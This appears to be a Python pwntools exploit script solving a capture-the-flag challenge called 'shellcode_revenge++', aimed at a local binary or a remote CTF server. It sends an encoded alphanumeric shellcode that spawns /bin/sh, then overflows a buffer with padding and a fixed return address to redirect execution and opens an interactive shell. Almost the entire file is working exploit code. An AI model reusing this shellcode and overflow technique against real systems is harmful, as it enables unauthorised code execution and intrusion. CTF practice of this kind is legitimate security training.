from pwn import *
import struct
context(os='linux', arch='amd64')

def getConn():
    return process('./shellcode_revenge++') if local else remote('shellcode-revenge.grandprix.whitehatvn.com', 10203)
local = True

r = getConn()
def debug(r):
	gdb.attach(r, '''
	break *0x40092A
	c
	''')
name_Retn=0x06010C0
junk="A"*16+p64(name_Retn)*2
shellcode = "UZjPXH1B1H1B24PPfhshfh//fhinfh/bT_PP^ZjPjPjPjPX4k_U"

def pwn():
	debug(r)
	print r.recvuntil('  ]:\n')
	r.send(shellcode)
	print r.recvuntil('for me!')
	r.send(junk)
	r.interactive()

pwn()

#r.close()

